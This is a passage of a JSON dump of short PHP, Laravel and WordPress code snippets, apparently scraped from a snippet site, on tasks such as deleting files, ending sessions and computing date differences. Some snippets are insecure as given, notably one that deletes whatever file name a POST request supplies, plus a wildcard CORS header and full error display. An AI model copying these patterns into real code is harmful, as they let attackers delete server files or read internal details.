    "description": "if(file_exists($file)) { \tunlink($file); } \n/* Deleting files is a concept in file handeling of PHP We can remove or delete the file from real folder path using below code */  unlink($Your_file_path);   // direct deleting the file  /* Delete file if its exist in folder */  if (file_exists($Your_file_path)) {   unlink($Your_file_path); }   /* I hope it will help you. Namaste */\nunlink(filepath);\n// delete file function, if silent is false, function will throw exception function deleteFile($fullFileName, $silent=0) {   if (file_exists($fullFileName)) {     unlink($fullFileName);     return TRUE;   } else {     if ($silent == 1) {       return FALSE;     } else {       throw new \\InvalidArgumentException('File \"'.$fullFileName.'\" not exists.');     }   } }\n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 968,
    "keyword": null,
    "link": null,
    "title": " delete file using php",
    "description": "if(file_exists($file)) { \tunlink($file); } \n/* Deleting files is a concept in file handeling of PHP We can remove or delete the file from real folder path using below code */  unlink($Your_file_path);   // direct deleting the file  /* Delete file if its exist in folder */  if (file_exists($Your_file_path)) {   unlink($Your_file_path); }   /* I hope it will help you. Namaste */\nunlink(filepath);\n <!DOCTYPE html>   <html>    <head>     <title>Ajax Image Insert Update Delete in Mysql Database using PHP</title>     <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js\"></script>     <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css\" />     <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>    </head>    <body>     <br /><br />     <div class=\"container\" style=\"width:900px;\">      <h3 align=\"center\">Ajax Image Insert Update Delete in Mysql Database using PHP</h3>      <br />    <div align=\"right\">     <button type=\"button\" name=\"add\" id=\"add\" class=\"btn btn-success\">Add</button>    </div>    <br />    <div id=\"image_data\">     </div>   </div>    </body>   </html>  <div id=\"imageModal\" class=\"modal fade\" role=\"dialog\">  <div class=\"modal-dialog\">   <div class=\"modal-content\">    <div class=\"modal-header\">     <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>     <h4 class=\"modal-title\">Add Image</h4>    </div>    <div class=\"modal-body\">     <form id=\"image_form\" method=\"post\" enctype=\"multipart/form-data\">      <p><label>Select Image</label>      <input type=\"file\" name=\"image\" id=\"image\" /></p><br />      <input type=\"hidden\" name=\"action\" id=\"action\" value=\"insert\" />      <input type=\"hidden\" name=\"image_id\" id=\"image_id\" />      <input type=\"submit\" name=\"insert\" id=\"insert\" value=\"Insert\" class=\"btn btn-info\" />            </form>    </div>    <div class=\"modal-footer\">     <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">Close</button>    </div>   </div>  </div> </div>   <script>   $(document).ready(function(){    fetch_data();   function fetch_data()  {   var action = \"fetch\";   $.ajax({    url:\"action.php\",    method:\"POST\",    data:{action:action},    success:function(data)    {     $('#image_data').html(data);    }   })  }  $('#add').click(function(){   $('#imageModal').modal('show');   $('#image_form')[0].reset();   $('.modal-title').text(\"Add Image\");   $('#image_id').val('');   $('#action').val('insert');   $('#insert').val(\"Insert\");  });  $('#image_form').submit(function(event){   event.preventDefault();   var image_name = $('#image').val();   if(image_name == '')   {    alert(\"Please Select Image\");    return false;   }   else   {    var extension = $('#image').val().split('.').pop().toLowerCase();    if(jQuery.inArray(extension, ['gif','png','jpg','jpeg']) == -1)    {     alert(\"Invalid Image File\");     $('#image').val('');     return false;    }    else    {     $.ajax({      url:\"action.php\",      method:\"POST\",      data:new FormData(this),      contentType:false,      processData:false,      success:function(data)      {       alert(data);       fetch_data();       $('#image_form')[0].reset();       $('#imageModal').modal('hide');      }     });    }   }  });  $(document).on('click', '.update', function(){   $('#image_id').val($(this).attr(\"id\"));   $('#action').val(\"update\");   $('.modal-title').text(\"Update Image\");   $('#insert').val(\"Update\");   $('#imageModal').modal(\"show\");  });  $(document).on('click', '.delete', function(){   var image_id = $(this).attr(\"id\");   var action = \"delete\";   if(confirm(\"Are you sure you want to remove this image from database?\"))   {    $.ajax({     url:\"action.php\",     method:\"POST\",     data:{image_id:image_id, action:action},     success:function(data)     {      alert(data);      fetch_data();     }    })   }   else   {    return false;   }  }); });   </script>  \n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 969,
    "keyword": null,
    "link": null,
    "title": " delete image s3 laravel",
    "description": "Storage::disk('s3')->delete('path/to/image/in/bucket'); \n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 970,
    "keyword": null,
    "link": null,
    "title": " delete in wordpress query",
    "description": "$id = 0815; $table = 'eLearning_progress'; $wpdb->delete( $table, array( 'id' => $id ) );\nwpdb::delete( string $table, array $where, array|string $where_format = null )\n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 971,
    "keyword": null,
    "link": null,
    "title": " delete multiple row by model in laravel",
    "description": "DB::table('users')->delete();  DB::table('users')->where('votes', '>', 100)->delete();\nApp\\Post; $post = Post::find($id); Comment::where('post_id',$post)->delete(); \npublic function destroy($id) {     if (is_array($id))      {         Product::destroy($id);     }     else     {         Product::findOrFail($id)->delete();     }     // redirect or whatever... }\n$org->products()->whereIn('id', $ids)->delete() \n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 972,
    "keyword": null,
    "link": null,
    "title": " delete property from object php",
    "description": "unset($a->new_property);\n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 973,
    "keyword": null,
    "link": null,
    "title": " delete route method in laravel",
    "description": "// Blade @method('delete')  // Html <input type=\"hidden\" name=\"_method\" value=\"delete\">\n<form method=\"POST\" action=\"{{ route('route.name', [ 'id'=> $item->id ]) }}\">               @csrf               <input type=\"hidden\" name=\"_method\" value=\"DELETE\">               <button type=\"submit\" class=\"btn btn-danger btn-icon\">                 <i data-feather=\"delete\"></i>               </button>             </form>\n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 974,
    "keyword": null,
    "link": null,
    "title": " delete uploaded file php",
    "description": "<?php unlink($_POST['filename']); echo 'Deleted'; ?> \nunlink(filepath);\n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 975,
    "keyword": null,
    "link": null,
    "title": " deprcation problem phpmyadmin ubuntu",
    "description": "sudo add-apt-repository ppa:nijel/phpmyadmin sudo apt update sudo apt install phpmyadmin \n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 976,
    "keyword": null,
    "link": null,
    "title": " deserialize php",
    "description": "<?php \t// $serialized     $unserialized = unserialize($serialized); ?>\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 977,
    "keyword": null,
    "link": null,
    "title": " destroy session codeigniter 3",
    "description": "# CI 3  # for spesific session $this->session->unset_userdata('some_name');  # for all session $this->session->sess_destroy();\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 978,
    "keyword": null,
    "link": null,
    "title": " destroy session php",
    "description": "// destroy the session <?php session_destroy(); ?>\nsession_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php    unset($_SESSION['counter']); ?>\nsession_unset();    //Destrol all session variables\n// Create a session variable called something like this after you start the session: $_SESSION['user_start'] = time();   // Then when they get to submitting the payment, just check whether they're within the 5 minute window if (time() - $_SESSION['user_start'] < 300) { // 300 seconds = 5 minutes     // they're within the 5 minutes so save the details to the database } else {     // sorry, you're out of time    unset($_SESSION['user_start']); // and unset any other session vars for this task }\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 979,
    "keyword": null,
    "link": null,
    "title": " determine special characters in php",
    "description": "<?php  $string = 'foo';  if (preg_match('/[\\'^&pound;$%&*()}{@#~?><>,|=_+&not;-]/', $string)) {     // one or more of the 'special characters' found in $string } \n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 980,
    "keyword": null,
    "link": null,
    "title": " diff for seconds  laravel carbon",
    "description": "    echo $tz = Carbon::now('Australia/Perth');     $local='2017-04-11 12:39:50';     echo $emitted = Carbon::parse($local);     echo $diff = $tz->diffInSeconds($emitted);     \n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 981,
    "keyword": null,
    "link": null,
    "title": " difference between GET, POST and REQUEST methods?",
    "description": "GET and POST are used to send information from client browser to web server. GET the information is send via GET method in name/value pair and is URL encoded. The default GET has a limit of 512 characters. The POST method transfers the information via HTTP Headers.  The POST method does not have any restriction in data size to be sent. POST is used for sending data securely and ASCII and binary type's data. The $_REQUEST contains the content of both $_GET, $_POST and $_COOKIE.\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 982,
    "keyword": null,
    "link": null,
    "title": " difference between fetch assoc and fetch array or object php",
    "description": "mysql_fetch_assoc \tThe function returns an associative array of strings that corresponds \tto the fetched row, or FALSE if there are no more rows. \tThe associativity array tells us about the key value pair, \twhereas the key tells about any column name and the value tells  \tabout the row value.  \tHere we can map the column name as key and value as row. For example. \tKey is ID and value is corresponding name.  mysql_fetch_array    This function name suggests that it returns an array.   It fetches a result row as an associative array, a    numeric array, or both. It has both numeric values as    well as string values for a key.  mysql_fetch_object This function returns row as an object and does not return an array.         \n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 983,
    "keyword": null,
    "link": null,
    "title": " difference between two timestamps php",
    "description": "$datetime1 = new DateTime('2016-11-30 03:55:06');//start time $datetime2 = new DateTime('2016-11-30 11:55:06');//end time $interval = $datetime1->diff($datetime2); echo $interval->format('%Y years %m months %d days %H hours %i minutes %s seconds');//00 years 0 months 0 days 08 hours 0 minutes 0 seconds\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 984,
    "keyword": null,
    "link": null,
    "title": " difference betwen include and indlude once",
    "description": "\"There is only one difference between include() and include_once().  If the code from a file has been already included then it will not be included again if we use include_once(). Means include_once() include the file only onceat a time.\"  include('filename'); include_once('filename');\n",
    "reg_date": "2021-10-12T10:13:39.000Z"
  },
  {
    "id": 985,
    "keyword": null,
    "link": null,
    "title": " difference entre deux date php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$datetime1 \t= new DateTime('2020-10-11 16:52:52'); $datetime2 \t= new DateTime('2020-10-13 16:52:52'); $interval \t= $datetime1->diff($datetime2);  echo $interval->format('%a days');\n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days\nphpCopy$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days \n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 986,
    "keyword": null,
    "link": null,
    "title": " difference of two dates in seconds php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n\tdate_default_timezone_set(\"Africa/Johannesburg\");     $now = new DateTime();     $future_date = new DateTime('2020-10-21 00:00:00');          $interval = $future_date->diff($now);          echo ($interval->format(\"%a\") * 24) + $interval->format(\"%h\"). \" hours\". $interval->format(\" %i minutes \");     print_r($now->format('Y-m-d H:i:s')); \n$timeFirst  = strtotime('2011-05-12 18:20:20'); $timeSecond = strtotime('2011-05-13 18:20:20'); $differenceInSeconds = $timeSecond - $timeFirst; \n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 987,
    "keyword": null,
    "link": null,
    "title": " differencew between == and === in php",
    "description": "==  It will return true if both value are same.   === It will return true if both value and their datatypes are matched.   Ex.    <?php   if(1.0 == 1)   {       echo 'true';   }   else{       echo 'false';   }   ?> \n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 988,
    "keyword": null,
    "link": null,
    "title": " different days in carbon laravel between different dates",
    "description": "$created = new Carbon($survey->created_at); $now = Carbon::now(); $difference = ($created->diff($now)->days < 1)     ? 'today'     : $created->diffForHumans($now);\n$to = \\Carbon\\Carbon::createFromFormat('Y-m-d H:s:i', '2015-5-5 3:30:34'); $from = \\Carbon\\Carbon::createFromFormat('Y-m-d H:s:i', '2016-6-6 9:30:34'); $diff_in_months = $to->diffInMonths($from); print_r($diff_in_months); // Output: 1\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 989,
    "keyword": null,
    "link": null,
    "title": " dir name php",
    "description": "<?php dirname(__FILE__); ?>\n// dirname ( string $path [, int $levels = 1 ] ) : string  <?php echo dirname(\"/etc/passwd\") . PHP_EOL; echo dirname(\"/etc/\") . PHP_EOL; echo dirname(\".\") . PHP_EOL; echo dirname(\"C:\\\\\") . PHP_EOL; echo dirname(\"/usr/local/lib\", 2);  // Above example outputs:  /* \t\"/etc\" \t\"/\" (or \"\\\" on Windows) \t\".\" \t\"C:\\\" \t\"/usr\" */ \n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 990,
    "keyword": null,
    "link": null,
    "title": " disable admin bar wordpress",
    "description": "add_action('after_setup_theme', 'remove_admin_bar');   function remove_admin_bar() { if (!current_user_can('administrator') && !is_admin()) {   show_admin_bar(false); } } \n/* Disable WordPress Admin Bar for all users */ add_filter( 'show_admin_bar', '__return_false' );\n/* Disable WordPress Admin Bar for all users */ add_filter( 'show_admin_bar', '__return_false' ); \n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 991,
    "keyword": null,
    "link": null,
    "title": " disable cors policy symfony",
    "description": "//his code in the file public/index.php work perfectly.  header('Access-Control-Allow-Origin: *'); header(\"Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method\"); header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE\"); header(\"Allow: GET, POST, OPTIONS, PUT, DELETE\"); $method = $_SERVER['REQUEST_METHOD']; if ($method == \"OPTIONS\") {     die(); }  https://stackoverflow.com/a/60642286/7610978\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 992,
    "keyword": null,
    "link": null,
    "title": " disable edit-link storefront",
    "description": "add_filter('edit_post_link', '__return_false');\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 993,
    "keyword": null,
    "link": null,
    "title": " disable laravel debugbar",
    "description": "Add DEBUGBAR_ENABLED=false to your .env\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 994,
    "keyword": null,
    "link": null,
    "title": " disable laravel passport",
    "description": "You can remove passport by manually deleting this line \"laravel/passport\": \"^4.0\"  in your composer.json file then run composer update. Or composer remove laravel/passport  If you're running Laravel 5.4 or below, make sure to remove this line in  your app.config file Laravel\\Passport\\PassportServiceProvider::class  And all classes that relies on passport must be edited as well.  The most common classes are:  1) User model, remove the HasApiToken trait. 2) AuthServiceProvider, remove Passport::routes(); in your boot method. 3) Your config/auth.php, change your driver option for api authentication  php artisan migrate:refresh run at the end of step.  To remove the Passport Migrations in database migrations table.  but please be careful in you are in production.      With Laravel 7  Step 1. In the file app/Providers/AuthServiceProvider.php, remove these two lines:  use Laravel\\Passport\\Passport; Passport::routes(); Step 2.  $ composer remove laravel/passport $ rm -r ./resources/js/components/passport # if any $ rm -r ./resources/views/vendor/passport # if any Step 3. In the file resources/js/app.js, remove passport components registration. You may also find and remove these registered components if you used it somewhere:  $ grep -rn 'passport-authorized-clients'     resources/js/* $ grep -rn 'passport-personal-access-tokens' resources/js/* $ grep -rn 'passport-clients'                resources/js/* Step 4. Find and remove HasApiTokens from your models:  $ grep -rn HasApiTokens *  Remove also the import line going with it:  use Laravel\\Passport\\HasApiTokens; Step 5. Remove oauth keys  $ rm storage/oauth-*.key Step 6. In the file config/auth.php, look for guards:api:driver and revert from passport to token.  Step 7. Drop Passport tables and clean migration table  $ php artisan tinker >>> Schema::drop('oauth_access_tokens'); >>> Schema::drop('oauth_auth_codes'); >>> Schema::drop('oauth_clients'); >>> Schema::drop('oauth_personal_access_clients'); >>> Schema::drop('oauth_refresh_tokens'); >>> DB::table('migrations')->where('migration', 'like', '%_oauth_access_tokens_table')->delete(); >>> DB::table('migrations')->where('migration', 'like', '%_oauth_auth_codes_table')->delete(); >>> DB::table('migrations')->where('migration', 'like', '%_oauth_clients_table')->delete(); >>> DB::table('migrations')->where('migration', 'like', '%_oauth_personal_access_clients_table')->delete(); >>> DB::table('migrations')->where('migration', 'like', '%_oauth_refresh_tokens_table')->delete(); >>> exit  Step 8. And finally, refresh your installation:  $ composer dump-autoload $ php artisan optimize:clear $ npm run dev    https://stackoverflow.com/questions/47567249/how-to-uninstall-laravel-passport\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 995,
    "keyword": null,
    "link": null,
    "title": " disable register laravel",
    "description": "Auth::routes(['register' => false]);\n",
    "reg_date": "2021-10-12T10:13:40.000Z"
  },
  {
    "id": 996,
    "keyword": null,
    "link": null,
    "title": " disable wordpress updates",
    "description": "define( 'WP_AUTO_UPDATE_CORE', false ); \n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 997,
    "keyword": null,
    "link": null,
    "title": " dispatch queue jobs",
    "description": "php artisan queue:work --queue=high,default\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 998,
    "keyword": null,
    "link": null,
    "title": " display all errors at once in laravel",
    "description": "@if($errors->any())     {!! implode('', $errors->all('<div>:message</div>')) !!} @endif \n@if(count($errors) > 0) <div class=\"p-1\">     @foreach($errors->all() as $error)     <div class=\"alert alert-warning alert-danger fade show\" role=\"alert\">{{$error}} <button type=\"button\" class=\"close\"             data-dismiss=\"alert\" aria-label=\"Close\">             <span aria-hidden=\"true\">&times;</span>         </button></div>     @endforeach </div> @endif\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 999,
    "keyword": null,
    "link": null,
    "title": " display all errors in blade laravel",
    "description": "@if($errors->any())     {!! implode('', $errors->all('<span class=\"text text-danger\">:message</span>')) !!} @endif\n@if(count($errors) > 0) <div class=\"p-1\">     @foreach($errors->all() as $error)     <div class=\"alert alert-warning alert-danger fade show\" role=\"alert\">{{$error}} <button type=\"button\" class=\"close\"             data-dismiss=\"alert\" aria-label=\"Close\">             <span aria-hidden=\"true\">&times;</span>         </button></div>     @endforeach </div> @endif\n @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif \n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1000,
    "keyword": null,
    "link": null,
    "title": " display category name wordpress",
    "description": "<?php $categories = get_the_category(); if ( ! empty( $categories ) ) { \techo '<a href=\"' . esc_url( get_category_link( $categories[0]->term_id ) ) . '\">' . esc_html( $categories[0]->name ) . '</a>'; } ?>\n<?php  \t$user_info = get_userdata(1); \techo 'Username: ' . $user_info->user_login . \"\\n\"; \techo 'User roles: ' . implode(', ', $user_info->roles) . \"\\n\"; \techo 'User ID: ' . $user_info->ID . \"\\n\"; ?>\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1001,
    "keyword": null,
    "link": null,
    "title": " display custom post type",
    "description": "/* * Creating a function to create our CPT */   function custom_post_type() {   // Set UI labels for Custom Post Type     $labels = array(         'name'                => _x( 'Movies', 'Post Type General Name', 'twentytwenty' ),         'singular_name'       => _x( 'Movie', 'Post Type Singular Name', 'twentytwenty' ),         'menu_name'           => __( 'Movies', 'twentytwenty' ),         'parent_item_colon'   => __( 'Parent Movie', 'twentytwenty' ),         'all_items'           => __( 'All Movies', 'twentytwenty' ),         'view_item'           => __( 'View Movie', 'twentytwenty' ),         'add_new_item'        => __( 'Add New Movie', 'twentytwenty' ),         'add_new'             => __( 'Add New', 'twentytwenty' ),         'edit_item'           => __( 'Edit Movie', 'twentytwenty' ),         'update_item'         => __( 'Update Movie', 'twentytwenty' ),         'search_items'        => __( 'Search Movie', 'twentytwenty' ),         'not_found'           => __( 'Not Found', 'twentytwenty' ),         'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwenty' ),     );       // Set other options for Custom Post Type           $args = array(         'label'               => __( 'movies', 'twentytwenty' ),         'description'         => __( 'Movie news and reviews', 'twentytwenty' ),         'labels'              => $labels,         // Features this CPT supports in Post Editor         'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),         // You can associate this CPT with a taxonomy or custom taxonomy.          'taxonomies'          => array( 'genres' ),         /* A hierarchical CPT is like Pages and can have         * Parent and child items. A non-hierarchical CPT         * is like Posts.         */          'hierarchical'        => false,         'public'              => true,         'show_ui'             => true,         'show_in_menu'        => true,         'show_in_nav_menus'   => true,         'show_in_admin_bar'   => true,         'menu_position'       => 5,         'can_export'          => true,         'has_archive'         => true,         'exclude_from_search' => false,         'publicly_queryable'  => true,         'capability_type'     => 'post',         'show_in_rest' => true,       );           // Registering your Custom Post Type     register_post_type( 'movies', $args );   }   /* Hook into the 'init' action so that the function * Containing our post type registration is not  * unnecessarily executed.  */   add_action( 'init', 'custom_post_type', 0 );\n$args = array(           'post_status' => 'publish',         'posts_per_page' => 5,            \t\t); \t     $loop = new WP_Query( $args );               while ( $loop->have_posts() ) : $loop->the_post();          the_title();  \tthe_excerpt();     endwhile;\n.wp-block-code { \tborder: 0; \tpadding: 0; }  .wp-block-code > div { \toverflow: auto; }  .hljs { \tbox-sizing: border-box; }  .hljs.shcb-code-table { \tdisplay: table; \twidth: 100%; }  .hljs.shcb-code-table > .shcb-loc { \tcolor: inherit; \tdisplay: table-row; \twidth: 100%; }  .hljs.shcb-code-table .shcb-loc > span { \tdisplay: table-cell; }  .wp-block-code code.hljs:not(.shcb-wrap-lines) { \twhite-space: pre; }  .wp-block-code code.hljs.shcb-wrap-lines { \twhite-space: pre-wrap; }  .hljs.shcb-line-numbers { \tborder-spacing: 0; \tcounter-reset: line; }  .hljs.shcb-line-numbers > .shcb-loc { \tcounter-increment: line; }  .hljs.shcb-line-numbers .shcb-loc > span { \tpadding-left: 0.75em; }  .hljs.shcb-line-numbers .shcb-loc::before { \tborder-right: 1px solid #ddd; \tcontent: counter(line); \tdisplay: table-cell; \tpadding: 0 0.75em; \ttext-align: right; \t-webkit-user-select: none; \t-moz-user-select: none; \t-ms-user-select: none; \tuser-select: none; \twhite-space: nowrap; \twidth: 1%; } // Register Custom Post Type - Workshop function kp_workshops() {  \t$args = array( \t\t'label' =>; __( 'Workshop', 'kp_workshops' ), \t\t'description' =>; __( 'Workshop listing', 'kp_workshops' ), \t\t'labels' =>; $labels, \t\t'supports' =>; array( 'title', 'editor', 'thumbnail', 'comments', 'revisions', 'custom-fields' ), \t\t'taxonomies' =>; array( 'category' ), \t\t'hierarchical' =>; false, \t\t'public' =>; true, \t\t'show_ui' =>; true, \t\t'show_in_menu' =>; true, \t\t'menu_position' =>; 20, \t\t'menu_icon' =>; 'dashicons-welcome-learn-more', \t\t'show_in_admin_bar' =>; true, \t\t'show_in_nav_menus' =>; true, \t\t'can_export' =>; true, \t\t'has_archive' =>; true, \t\t'exclude_from_search' =>; false, \t\t'publicly_queryable' =>; true, \t\t'capability_type' =>; 'page', \t\t'show_in_rest' =>; true, \t);  \tregister_post_type( 'workshops', $args );  } add_action( 'init', 'kp_workshops', 0 );\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1002,
    "keyword": null,
    "link": null,
    "title": " display date time twig",
    "description": "// date {{ post.published_at|date(\"m/d/Y\") }}  // date time {{ post.published_at|date('Y-m-d H:i:s') }} \n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1003,
    "keyword": null,
    "link": null,
    "title": " display errors in codeigniter",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); inside config/database.php\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1004,
    "keyword": null,
    "link": null,
    "title": " display picture in pdf generated with laravel",
    "description": "   //in Controller             $path = 'images/V.png';         $type = pathinfo($path, PATHINFO_EXTENSION);         $data = file_get_contents($path);         $logo = 'data:image/' . $type . ';base64,' . base64_encode($data);   //in View          <img src=\"{{ $data['logo'] }}\" width=\"150\" height=\"150\" />                 \n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1005,
    "keyword": null,
    "link": null,
    "title": " display time php",
    "description": "$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \ndate(format,timestamp)  //example date(\"Y.m.d\") //default timestamp is current time.\n<?php // set the default timezone to use. Available since PHP 5.1 date_default_timezone_set('UTC');   // Prints something like: Monday echo date(\"l\");  // Prints something like: Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Prints: July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* use the constants in the format parameter */ // prints something like: Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // prints something like: 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>\n",
    "reg_date": "2021-10-12T10:13:41.000Z"
  },
  {
    "id": 1006,
    "keyword": null,
    "link": null,
    "title": " displaying errors in laravel",
    "description": "@if($errors->any())     {!! implode('', $errors->all('<div>:message</div>')) !!} @endif \n@if(count($errors) > 0) <div class=\"p-1\">     @foreach($errors->all() as $error)     <div class=\"alert alert-warning alert-danger fade show\" role=\"alert\">{{$error}} <button type=\"button\" class=\"close\"             data-dismiss=\"alert\" aria-label=\"Close\">             <span aria-hidden=\"true\">&times;</span>         </button></div>     @endforeach </div> @endif\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1007,
    "keyword": null,
    "link": null,
    "title": " displaying laravel error in below input field",
    "description": "@error('field-name')     <div class=\"alert alert-danger\">{{ $message }}</div> @enderror \n",
    "reg_date": "2021-10-12T10:13:42.000Z"
  },
  {
    "id": 1008,
    "keyword": null,
